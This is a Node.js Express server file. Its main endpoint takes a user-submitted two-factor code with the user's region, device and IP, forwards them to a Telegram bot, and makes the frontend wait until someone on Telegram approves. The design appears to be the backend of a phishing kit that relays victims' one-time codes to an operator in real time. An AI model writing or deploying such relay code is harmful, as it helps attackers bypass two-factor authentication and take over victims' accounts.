require('dotenv').config();
const express = require('express');
const bodyParser = require('body-parser');
const cors = require('cors');
const { sendTelegram2FARequest, setApprovalStatus, getApprovalStatus, bot } = require('./bot');
const { v4: uuidv4 } = require('uuid');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;

app.use(cors());
app.use(bodyParser.json());
app.use(express.static(path.join(__dirname, '../public')));

// Telegram webhook endpoint
app.post(`/bot${process.env.BOT_TOKEN}`, (req, res) => {
  bot.processUpdate(req.body);
  res.sendStatus(200);
});

// API to submit 2FA code
app.post('/api/submit-2fa', async (req, res) => {
  const { code, region, device, ip } = req.body;
  const requestId = uuidv4();

  setApprovalStatus(requestId, 'pending');
  await sendTelegram2FARequest({ code, region, device, ip, requestId });

  res.json({ status: 'pending', requestId });
});

// API to poll approval status
app.get('/api/approval-status/:requestId', (req, res) => {
  const status = getApprovalStatus(req.params.requestId);
  res.json({ status });
});

// Serve frontend (if you want to serve HTML from backend)
app.get('*', (req, res) => {
  res.status(404).send('Not found');
});

app.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
});

